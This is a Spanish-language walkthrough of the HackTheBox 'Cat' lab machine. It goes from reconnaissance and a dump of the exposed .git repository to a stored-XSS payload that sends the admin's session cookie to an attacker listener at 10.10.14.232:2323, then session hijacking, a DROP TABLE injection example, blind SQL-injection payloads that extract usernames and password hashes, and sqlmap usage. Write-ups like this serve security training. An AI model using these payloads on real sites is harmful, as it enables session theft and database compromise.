
Puertos tcp abiertos nmap Syn scan
```bash
sudo nmap -sS -p- -T4 -Pn -n  -v cat.htb 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-06 11:51 CET
Initiating SYN Stealth Scan at 11:51
Scanning cat.htb (10.10.11.53) [65535 ports]
Discovered open port 80/tcp on 10.10.11.53
Discovered open port 22/tcp on 10.10.11.53
Completed SYN Stealth Scan at 11:52, 20.10s elapsed (65535 total ports)
Nmap scan report for cat.htb (10.10.11.53)
Host is up (0.062s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.20 seconds
           Raw packets sent: 65943 (2.901MB) | Rcvd: 65605 (2.625MB)
```

Puertos UDP abiertos
```bash
None
```

Analisis de puertos
```bash
sudo nmap -sCV -p 22,80 -T4 -Pn -n -v cat.htb
ost is up (0.040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   10.10.11.53:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Cat v1 
|_http-title: Best Cat Competition
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.20 seconds
           Raw packets sent: 2 (88B) | Rcvd: 2 (88B)

```
## Nmap Summary

| Port | Software | Version                                                       | Status |
| ---- | -------- | ------------------------------------------------------------- | ------ |
| 22   | ssh      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | open   |
| 80   | http     | Apache httpd 2.4.41 ((Ubuntu))                                | open   |


# Puerto 80

```python
➜  ~ whatweb http://cat.htb:80

http://cat.htb:80 [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.53], Title[Best Cat Competition]
```
Vista principal:
![[Pasted image 20250206115548.png]]


## Fuzzing

Hacemos fuzzing de subdominos a ver si encontramos alguno;
```bash
sudo wfuzz -c -f sub-fighter.txt -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --sc 200,202,204,301,302,307,403 http://FUZZ.cat.htb:80 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://FUZZ.cat.htb:80/
Total requests: 4992

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                 
=====================================================================


^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 975.6446
Processed Requests: 2657
Filtered Requests: 2657
Requests/sec.: 2.723327

```
Ningun subdomino encontrado de momento;

Usamos Feroxbuster para el fuzzing de endpoints en http://cat.htb:80
```bash
200      GET       41l       83w     1242c http://cat.htb/vote.php
200      GET      140l      327w     4004c http://cat.htb/join.php
200      GET      127l      270w     2900c http://cat.htb/css/styles.css
200      GET      196l      415w     5082c http://cat.htb/winners.php
200      GET      129l      285w     3075c http://cat.htb/
200      GET      127l      270w     2900c http://cat.htb/css/styles
200      GET      304l     1647w   132808c http://cat.htb/img/cat1
200      GET      904l     5604w   448419c http://cat.htb/img/cat2
[####################] - 2m     56163/56163   535/s   http://cat.htb/ 
[####################] - 2m     56163/56163   535/s   http://cat.htb/uploads/ 
[####################] - 2m     56163/56163   552/s   http://cat.htb/img/ 
[####################] - 2m     56163/56163   561/s   http://cat.htb/css/ 
[####################] - 2m     56163/56163   586/s   http://cat.htb/winners/    
```


### /Login.php
![[Pasted image 20250206120226.png]]
Si pinchamos en `Already have an account?` nos redirige al endpoint `/join.php` Pruebo a logearme:
![[Pasted image 20250206120341.png]]
Parece que el servidor maneja cookies de autenticacion
![[Pasted image 20250206120416.png]]
```java
PHPSESSID:"el281bprg2ti42m6j0htoq4bom"
```


### /Contest.php
Una vez logueados parece que podemos apuntar a nuestro gato en el concurso a traves del formulario en `/contest.php` vamos a analizar la subida de imagenes en burp
![[Pasted image 20250206120536.png]]

Realizamos el formulario para nuestro gato cyberpunk:
![[Pasted image 20250206120915.png]]
Request:
```java
POST /contest.php HTTP/1.1
Host: cat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------2525655587332479862513910270
Content-Length: 125072
Origin: http://cat.htb
Connection: keep-alive
Referer: http://cat.htb/contest.php
Cookie: PHPSESSID=el281bprg2ti42m6j0htoq4bom
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------2525655587332479862513910270
Content-Disposition: form-data; name="cat_name"

GATO2
-----------------------------2525655587332479862513910270
Content-Disposition: form-data; name="age"

23
-----------------------------2525655587332479862513910270
Content-Disposition: form-data; name="birthdate"

2077-02-02
-----------------------------2525655587332479862513910270
Content-Disposition: form-data; name="weight"

95
-----------------------------2525655587332479862513910270
Content-Disposition: form-data; name="cat_photo"; filename="image(1).png"
Content-Type: image/png

PNG

   
IHDR  7  S   ËöÓ7   	pHYs  Ä  Ä+    IDATxìw\GÇ½JïJ·6P{ïÝ{ï-ÄDc7±
...
```

Response:

```java
HTTP/1.1 200 OK
Date: Thu, 06 Feb 2025 11:09:45 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2391
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8



<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Contest - Best Cat Community</title>
<link rel="stylesheet" href="css/styles.css">
<style>
    .container {
        max-width: 600px;
        margin: 20px auto;
        padding: 20px;
        background-color: #fff;
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    form {
        padding: 20px;
        box-sizing: border-box;
    }
    label,
    input {
        display: block;
        margin-bottom: 10px;
        width: 100%;
    }
    input[type="submit"] {
        background-color: #007bff;
        color: #fff;
        border: none;
        border-radius: 5px;
        padding: 15px 20px;
        cursor: pointer;
        transition: background-color 0.3s;
        width: 100%;
    }
    input[type="submit"]:hover {
        background-color: #0056b3;
    }
    .message {
        margin-top: 20px;
        text-align: center;
        color: green;
    }
    .error-message {
        margin-top: 20px;
        text-align: center;
        color: red;
    }
</style>
</head>
<body>

    <div class="navbar">
        <a href="/">Home</a>
        <a href="/vote.php">Vote</a>
        <a href="/contest.php">Contest</a>
        <a href="/winners.php">Winners</a>
        <a href="/logout.php">Logout</a>    </div>

    <div class="container">
        <h1>Contest - Best Cat Community</h1>
                    <div class="message">Cat has been successfully sent for inspection.</div>
                        <form method="post" enctype="multipart/form-data">
            <label for="cat_name">Cat Name:</label>
            <input type="text" id="cat_name" name="cat_name" required>
            <label for="age">Cat Age:</label>
            <input type="number" id="age" name="age" required>
            <label for="birthdate">Cat Birthdate:</label>
            <input type="date" id="birthdate" name="birthdate" required>
            <label for="weight">Cat Weight (in kg):</label>
            <input type="number" id="weight" name="weight" step="0.01" required>
            <label for="cat_photo">Cat Photo:</label>
            <input type="file" id="cat_photo" name="cat_photo" accept="image/*" required>
            <input type="submit" value="Register Cat">
        </form>
    </div>

</body>
</html>



```

Intento buscar donde se guardan las imagenes subidas al servidor; En /vote.php las 3 imagenes visibles se guardan en los siguientes endpoints:

```python
http://cat.htb/img/cat3.webp
http://cat.htb/img/cat2.png
http://cat.htb/img/cat1.jpg
```

### /uploads
He probado mil maneras de acceder a la imagen pero no parece que el servidor este guardando las imagenes con el mismo nombre que se suben o igual no en ese directorio ;  Prosigo haciendo el Recon



## /.git
En el escaneo con nmap nos encuentra un repositorio de git
El endpoint da forbidden.
![[Pasted image 20250206115612.png]]
Vamos a usar la suite de herramientas de `GitTools` .
[Repositorio](https://github.com/internetwache/GitTools.git)

```bash
➜  Dumper git:(master) ./gitdumper.sh http://cat.htb/.git/ GitCatDump
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating GitCatDump/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/8c/2c2701eb4e3c9a42162cfb7b681b6166287fd5
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/c9/e281ffb3f5431800332021326ba5e97aeb2764
[+] Downloaded: objects/56/03bb235ee634e1d7914def967c26f9dd0963bb
[+] Downloaded: objects/64/d98c5af736de120e17eff23b17e22aad668718
[+] Downloaded: objects/31/e87489c5f8160f895e941d00087bea94f21315
[+] Downloaded: objects/0c/be0133fb00b13165bd7318e42e17f322daac7f
[+] Downloaded: objects/6f/ae98c9ae65a9ecbf37e821e7bafb48bcdac2bc
[+] Downloaded: objects/91/92afa265e9e73f533227e4f118f882615d3640
[+] Downloaded: objects/0f/fa90ae01a4f353aa2f6b2de03c212943412222
[+] Downloaded: objects/b8/7b8c6317f8e419dac2c3ce3517a6c93b235028
[+] Downloaded: objects/26/bd62c92bcf4415f2b82514bbbac83936c53cb5
[+] Downloaded: objects/38/660821153b31dbbee89396eacf974c095ab0dc
[+] Downloaded: objects/58/62718ef94b524f3e36627e6f2eae1e3570a7f4
[+] Downloaded: objects/b7/df8d295f9356332f9619ae5ecec3230a880ef2
[+] Downloaded: objects/88/12266cb97013f416c175f9a9fa08aae524c92a
[+] Downloaded: objects/cf/8166a8873d413e6afd88fa03305880e795a2c6
[+] Downloaded: objects/9a/dbf70baf0e260d84d9c8666a0460e75e8be4a8
[+] Downloaded: objects/48/21d0cd8fecc8c3579be5735b1aab69f1637c86
[+] Downloaded: objects/7b/a662bf012ce71d0db9e86c80386b7ae0a54ea1
[+] Downloaded: objects/9b/e1a76f22449a7876a712d34dc092f477169c36
[+] Downloaded: objects/09/7745b30047ab3d3e6e0c5239c2dfd5cac308a5
```
Vamos a echar un vistazo a ver si encontramos algo interesante;
```bash
.git git:(master) strings index
DIRC
accept_cat.php
        admin.php
config.php
contest.php
css/styles.css
?S2'
a]6@
delete_cat.php
img/cat1.jpg
img/cat2.png
img/cat3.webp
img_winners/cat1.jpg
img_winners/cat2.png
img_winners/cat3.webp
;#P(
        index.php
join.php
logout.php
KRO>6b~o.
view_cat.php
vote.php
winners.php
                        wE
&winners/cat_report_20240831_173129.php
TREE
19 4
3 !2k
'dcss
<!)CA""winners
=A>j
img_winners
<!)CA""o
t6+x
```
Parece que encontramos algunos endpoints interesantes como `delete_cat.php` o `view_cat.php`

--- 
### view_cat.php
Pruebo el endpoint pero me redirige
![[Pasted image 20250206162924.png]]
### delete_cat.php
Este endpoint me da un 200 pero con el mensaje "access denied" puede sernos de utilidad mas tarde
![[Pasted image 20250206164029.png]]

--- 
El archivo  .git/logs/HEAD es el archivo de un commit 
```bash
0000000000000000000000000000000000000000 8c2c2701eb4e3c9a42162cfb7b681b6166287fd5 Axel <axel2017@gmail.com> 1725146774 +0000    commit (initial): Cat v1
```
Nos guardamos el mail como posible usuario explotable



Pruebo con git-dumper ya que esta anterior no me exporto todo lo que tenia que exportar; (me lo conto un pajarito)
```bash
(venv) ➜  DUMP git:(master) tree .
.
|-- accept_cat.php
|-- admin.php
|-- config.php
|-- contest.php
|-- css
|   `-- styles.css
|-- delete_cat.php
|-- img
|   |-- cat1.jpg
|   |-- cat2.png
|   `-- cat3.webp
|-- img_winners
|   |-- cat1.jpg
|   |-- cat2.png
|   `-- cat3.webp
|-- index.php
|-- join.php
|-- logout.php
|-- view_cat.php
|-- vote.php
|-- winners
|   `-- cat_report_20240831_173129.php
`-- winners.php
```
Ahora ya tenemos código fuente de la pagina; vamos a ver si encontramos algún endpoint vulnerable;




# XSS en el endpoint /join.php

Vemos a continuacion el codigo de join.php:

```php
<?php
session_start();

include 'config.php';

$success_message = "";
$error_message = "";

// Registration process
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
    $username = $_GET['username'];
    $email = $_GET['email'];
    $password = md5($_GET['password']);

    $stmt_check = $pdo->prepare("SELECT * FROM users WHERE username = :username OR email = :email");
    $stmt_check->execute([':username' => $username, ':email' => $email]);
    $existing_user = $stmt_check->fetch(PDO::FETCH_ASSOC);

    if ($existing_user) {
        $error_message = "Error: Username or email already exists.";
    } else {
        $stmt_insert = $pdo->prepare("INSERT INTO users (username, email, password) VALUES (:username, :email, :password)");
        $stmt_insert->execute([':username' => $username, ':email' => $email, ':password' => $password]);

        if ($stmt_insert) {
            $success_message = "Registration successful!";
        } else {
            $error_message = "Error: Unable to register user.";
        }
    }
}

// Login process
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['loginForm'])) {
    $username = $_GET['loginUsername'];
    $password = md5($_GET['loginPassword']);

    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
    $stmt->execute([':username' => $username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($user && $password === $user['password']) {
        $_SESSION['username'] = $user['username'];
        header("Location: /");
        exit();
    } else {
        $error_message = "Incorrect username or password.";
    }
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Join the Best Cat Community</title>
<link rel="stylesheet" href="css/styles.css">
<style>
    .container {
        max-width: 600px;
        margin: 20px auto;
        padding: 20px;
        background-color: #fff;
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .card {
        overflow: hidden;
        transition: height 0.3s ease-in-out;
        border: 1px solid #ccc;
        border-radius: 5px;
        margin-bottom: 40px; /* Increased margin between cards */
    }
    .card.register {
        height: 400px;
    }
    .card.login {
        height: 400px;
    }
    form {
        padding: 20px;
        box-sizing: border-box;
    }
    label,
    input {
        display: block;
        margin-bottom: 10px;
        width: 100%; /* Make inputs fill the width */
    }
    input[type="submit"] {
        background-color: #007bff;
        color: #fff;
        border: none;
        border-radius: 5px;
        padding: 15px 20px;
        cursor: pointer;
        transition: background-color 0.3s;
        width: 100%; /* Make button fill the width */
    }
    input[type="submit"]:hover {
        background-color: #0056b3;
    }
    .toggle-link {
        text-align: center;
        margin-bottom: 20px;
    }
    .toggle-link a {
        text-decoration: none;
        color: #007bff;
        transition: color 0.3s;
    }
    .toggle-link a:hover {
        color: #0056b3;
    }
    .message {
        margin-top: 20px;
        text-align: center;
        color: green;
    }
    .error-message {
        margin-top: 20px;
        text-align: center;
        color: red;
    }
</style>
</head>
<body>

<div class="navbar">
    <a href="/">Home</a>
    <a href="/vote.php">Vote</a>
    <a href="/contest.php">Contest</a>
    <a href="/winners.php">Winners</a>
    <a href="/join.php">Join</a>
</div>

<div class="container">
    <h1>Join the Best Cat Community</h1>
    <?php if ($success_message != ""): ?>
        <div class="message"><?php echo $success_message; ?></div>
    <?php endif; ?>
    <?php if ($error_message != ""): ?>
        <div class="error-message"><?php echo $error_message; ?></div>
    <?php endif; ?>
    <div class="card register">
        <center><h2>Register</h2></center>
        <form id="registerForm" method="get">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
            <label for="email">Email:</label>
            <input type="email" id="email" name="email" required>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <input type="submit" name="registerForm" value="Register">
        </form>
    </div>
    <div class="card login" style="display: none;">
        <center><h2>Login</h2></center>
        <form id="loginForm" method="get">
            <label for="loginUsername">Username:</label>
            <input type="text" id="loginUsername" name="loginUsername" required>
            <label for="loginPassword">Password:</label>
            <input type="password" id="loginPassword" name="loginPassword" required>
            <input type="submit" name="loginForm" value="Login">
        </form>
    </div>
    <div class="toggle-link">
        <a href="#" id="toggleForm">Already have an account?</a>
    </div>
</div>

<script>
    var toggleLink = document.getElementById("toggleForm");
    var registerForm = document.querySelector(".register");
    var loginForm = document.querySelector(".login");

    toggleLink.addEventListener("click", function(event) {
        event.preventDefault();
        if (registerForm.style.display === "block") {
            registerForm.style.display = "none";
            loginForm.style.display = "block";
            toggleLink.textContent = "Register"; // Changed text
        } else {
            registerForm.style.display = "block";
            loginForm.style.display = "none";
            toggleLink.textContent = "Already have an account?"; // Changed text
        }
    });
</script>
</body>
</html>
```

### **1. Vulnerabilidad a XSS 

En las siguientes líneas:
```php
// Registration process
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
    $username = $_GET['username'];
    $email = $_GET['email'];
    $password = md5($_GET['password']);

    $stmt_check = $pdo->prepare("SELECT * FROM users WHERE username = :username OR email = :email");
    $stmt_check->execute([':username' => $username, ':email' => $email]);```


Tamto el campo $username como $email no estan siendo sanitizados antes de registrarlos en la base de datos; por lo tanto . Si como atacantes nos registramos de forma que:
```java
`Username: <script>alert(document.cookie)</script>
 Email: cher0@mail.com`
```
Si en algun punto logramos que nuestro nombre de cuenta se muestre es probable que podamos robar cookies de usuario. De momento lo dejamos registrado;

### Script automatizado 

Para agilizar el proceso de Injeccion del XSS hice un script de python que podeis encontrar en mi perfil de Github ; El script se compone de 4 fases, 
* 1-Registra el usuario con el payload XSS con las etiquetas necesarias para pillar la cookie del admin
* 2-Se Logea el usuario en la pagina con las peticiones necesarias al servidor
* 3- Sube una imagen indicada en el primer argumento del escript en contest.php
* 4-Se abre un servidor http que captura la Cookie de sesión del administrador de la pagina 

Podeis descargarla en el siguiente [enlace](https://github.com/cher0qui/HTB-Cat-Automated-XSS/tree/main) 
# Sqli en accept_cat.php
Vamos a observar el codigo:
```php
<?php
include 'config.php';
session_start();

if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);

            $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete->execute();

            echo "The cat has been accepted and added successfully.";
        } else {
            echo "Error: Cat ID or Cat Name not provided.";
        }
    } else {
        header("Location: /");
        exit();
    }
} else {
    echo "Access denied.";
}
?>

```
Bueno aqui ya observamos mas info sobre la base de datos; vemos que hay una tabla accepted_cats y otra cats;

El código incluye una verificación para asegurarse de que solo el usuario **`axel`** pueda realizar la inserción o eliminación

Observamos el campo vulnerable
SQLI:
```php
$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
$pdo->exec($sql_insert);
```

- Aquí, el valor de `$cat_name` proviene directamente de `$_POST['catName']` sin ser validado ni escapado.
- Aunque está usando PDO para ejecutar consultas, no está utilizando consultas preparadas con marcadores de posición (`:parametro`) para esta inserción. En su lugar, está concatenando el valor directamente en la consulta SQL.
- Esto  nos permite inyectar código SQL  a través del campo `catName`.

Por ejemplo si mandamos:
```sql
'); DROP TABLE accepted_cats; --
```
la consulta que procesa el servidor pasa a ser:
```sql
INSERT INTO accepted_cats (name) VALUES(''); DROP TABLE accepted_cats; --');
```

Pero para ello necesitamos primero ser axel asi que vamos a intentar robar su cookie phpssid con el xss anterior.

## contest.php
Encuentro la linea de codigo donde podemos ver como se guardan nuestros gatos subidos
```php
        // Generate unique identifier for the image
        $imageIdentifier = uniqid() . "_";

        // Upload cat photo
        $target_dir = "uploads/";
        $target_file = $target_dir . $imageIdentifier . basename($_FILES["cat_photo"]["name"]);
        $uploadOk = 1;
        $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

        // Check if the file is an actual image or a fake file
        $check = getimagesize($_FILES["cat_photo"]["tmp_name"]);
        if($check !== false) {
            $uploadOk = 1;
        } else {
            $error_message = "Error: The file is not an image.";
            $uploadOk = 0;
        }

        // Check if the file already exists
        if (file_exists($target_file)) {
            $error_message = "Error: The file already exists.";
            $uploadOk = 0;
        }

        // Check file size
        if ($_FILES["cat_photo"]["size"] > 500000) {
            $error_message = "Error: The file is too large.";
            $uploadOk = 0;
        }

        // Allow only certain file formats
        if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg") {
            $error_message = "Error: Only JPG, JPEG, and PNG files are allowed.";
            $uploadOk = 0;
        }
```
No podiamos encontrar nuestra imagen en uploads/ ya que se genera un uniqid() seguido de " _ "  


## Exploit
Primero nos registramos con un XSS que mande la cookie de axel a nuestro servidor 
```bash
<script>document.location='http://10.10.14.232:2323/?c='+document.cookie;</script>
```
![[Pasted image 20250207131614.png]]


Acto seguido abrimos un servidor http por el puerto indicado en XSS y subimos un gato, cuando el admin lo revise y muestre nuestro "username" se triggerea el XSS mandandonos su cookie;
![[Pasted image 20250207131820.png]]

Ahora que tenemos el phpssid de axel probamos a hacer un session Hijacking modificando nuestra cookie

Admin Panel:
![[Pasted image 20250207132842.png]]


Ahora vamos a explotar la injeccion sql en accept_cat.php

Recordemos el codigo

```php
<?php
include 'config.php';
session_start();

if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);

            $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete->execute();

            echo "The cat has been accepted and added successfully.";
        } else {
            echo "Error: Cat ID or Cat Name not provided.";
        }
    } else {
        header("Location: /");
        exit();
    }
} else {
    echo "Access denied.";
}
?>

```


Preparamos un Request POST para dumpear la base de datos:
```python
POST /accept_cat.php HTTP/1.1
Host: cat.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=dc19d9vca314ihdq9g6h

catId=1&catName=test
```

Sqlmap nos confirma que el campo es vulnerable

```sql
sqlmap identified the following injection point(s) with a total of 126 HTTP(s) requests:
---
Parameter: catName (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catId=1&catName=test'||(SELECT 0x6b575974 WHERE 9070=9070 AND 3453=3453)||'
---
[13:46:48] [INFO] testing MySQL
[13:46:48] [WARNING] the back-end DBMS is not MySQL
[13:46:48] [CRITICAL] sqlmap was not able to fingerprint the back-end database management system
[13:46:48] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 84 times

[*] ending @ 13:46:48 /2025-02-07/

```

Con esta solicitud mandamos esta query SQL al servidor
```sql 
INSERT INTO accepted_cats (name) VALUES ('TEST' UNION ALL SELECT NULL, table_name FROM information_schema.tables WHERE 1=1 AND '1'='1')'
```

Query valida:
![[Pasted image 20250207135540.png]]



SQLI:
![[Pasted image 20250207140253.png]]


### SQL BLIND BOOLEAN BASED
500 server INTERNAL ERROR:
![[Pasted image 20250207180808.png]]
### EXISTE LA TABLA USERS?:
![[Pasted image 20250207180840.png]]
### Existe la columna password?
```sql 
POST /accept_cat.php HTTP/1.1
Host: cat.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=5k79n5uih9n3lf2i9n2cv21p4q
Content-Length: 103

catId=1&catName=test'||(SELECT 'true' FROM pragma_table_info('users') WHERE name='password' LIMIT 1)||'
```
![[Pasted image 20250208180856.png]]
También descubro la existencia de la columna "username"
```sql
POST /accept_cat.php HTTP/1.1
Host: cat.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=5k79n5uih9n3lf2i9n2cv21p4q
Content-Length: 103

catId=1&catName=test'||(SELECT 'true' FROM pragma_table_info('users') WHERE name='username' LIMIT 1)||'
```
![[Pasted image 20250208181220.png]]

Pues ahora a sacar los Usernames y las passwords;

## Usernames & passwords Blind sqli
####  1. Payload Base para Extraer Caracteres del nombre
```sql
catId=1&catName=test'||(SELECT 'true' FROM users WHERE SUBSTR(username, N, 1) = 'STRING' LIMIT 1)||'
```

- N : es la coordenada del caracter, es decir N=1 primera string
- STRING : letra

Probamos con la a de Axel a ver si existe;
![[Pasted image 20250208182307.png]]
la b da un 500 Internal server erros por lo que comprobamos que el payload funciona!;
![[Pasted image 20250208182334.png]]

para sacar el segundo username de la base de datos basta con poner "LIMIT 1 OFFSET 1"
ahora sabemos que el segundo nombre de usuario empieza por "r":
![[Pasted image 20250208182641.png]]


####  2. Payload Base para Extraer Caracteres de la password
Basicamente lo mismo que arriba pero cambiando los parametros de la columna
```sql
catId=1&catName=test'||(SELECT 'true' FROM users WHERE SUBSTR(password, N, 1) = 'STRING' LIMIT 1)||'

```
![[Pasted image 20250208183008.png]]

### 3. Payload Base para saber la longitud de caracteres del Username
```sql
POST /accept_cat.php HTTP/1.1
Host: cat.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=b4tdio58t0hjkt9od29jkfgo8j
Content-Length: 87

catId=1&catName=test'||(SELECT 'true' FROM users WHERE LENGTH(username) = 4 LIMIT 1)||'
```
Nos devuelve el 200 ya que sabemos que el primer username es Axel:
![[Pasted image 20250208185930.png]]

### 4. Payload Base para saber la longitud de caracteres del password
Lo mismo, diferente columna
```sql
POST /accept_cat.php HTTP/1.1
Host: cat.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=421ue72qb057o1qhe5rge2cb7i
Content-Length: 97

catId=1&catName=test'||(SELECT 'true' FROM users WHERE LENGTH(password) = 32 LIMIT 1 OFFSET 0)||'
```
Ya uso offset 0 para referirme a la password de axel ; bueno sabemos que tiene 32 caracteres ya que nos da el 200 ok 

Para averiguar la longitud lo pase por en intruder para que me fuese haciendo un ataque de fuerza bruta por numeros del 1 al 100 , el que me dio respuesta 200 fue "32"
![[Pasted image 20250208190401.png]]
![[Pasted image 20250208190522.png]]
Tambien parece que el resto de passwords en la database tienen 32 caracteres ya que deben de estar hasheadas con el mismo algoritmo;
## Payload !

Vamos a crear un payload para sacar todos los campos de la tabla users empezando por los usernames y luego por las passwords respectivamente

hasta ahora la información que tenemos es 
	- El servidor devuelve un 500 server internal error si la query no resuelve en la base de datos
	- Tenemos la tabla users con las columnas username y password
	- la primera fila de la tabla tiene al usuario Axel
	-  las passwords tienen una longitud de 32 caracteres
Necesitamos
	- Sacar el resto de usernames de la tabla users
	- Sacar las passwords de cada user caracter a caracter 

### Tecnicismos

#### **1. Función `send_payload`:**

- Envía el payload al servidor y verifica si la respuesta tiene un código de estado `200 OK`.
- Si la consulta SQL es válida, el servidor responderá con `200 OK`. De lo contrario, devolverá `500 Internal Server Error`.

#### **2. Función `dump_field`:**

- Dumpea un campo específico (`username` o `password`) caracter por caracter.
- Usa `SUBSTR()` para extraer cada carácter en una posición específica.
- Itera sobre todos los caracteres ASCII imprimibles (de `32` a `126`).

#### **3. Función `main`:**

- Dumpea todos los nombres de usuario hasta un offset máximo (`max_users`).
- Luego, dumpea las contraseñas correspondientes a cada nombre de usuario.
- Almacena los resultados en listas y los imprime al final.

---

### **Cómo Funciona el Script**

1. **Dumpear Nombres de Usuario:**
    
    - Para cada offset (`i`), intenta dumpear el nombre de usuario letra por letra.
    - Si no encuentra más usuarios, detiene el proceso.
2. **Dumpear Contraseñas:**
    
    - Para cada nombre de usuario dumpeado, intenta dumpear su contraseña letra por letra.
    - Suponemos que todas las contraseñas tienen una longitud fija de 32 caracteres.
3. **Imprimir Resultados:**
    
    - Al final, muestra una lista de usuarios y sus contraseñas correspondientes.

---




## SQLMAP
Sqlmap tambien funciona por si no te quieres tirar varios dias 
```bash
➜  Cat sqlmap -r request -p catName --level=5 --tables --dump --risk=3 --dbms=sqlite --threads=10
        ___
       __H__                                                                   
 ___ ___[(]_____ ___ ___  {1.9#stable}                                         
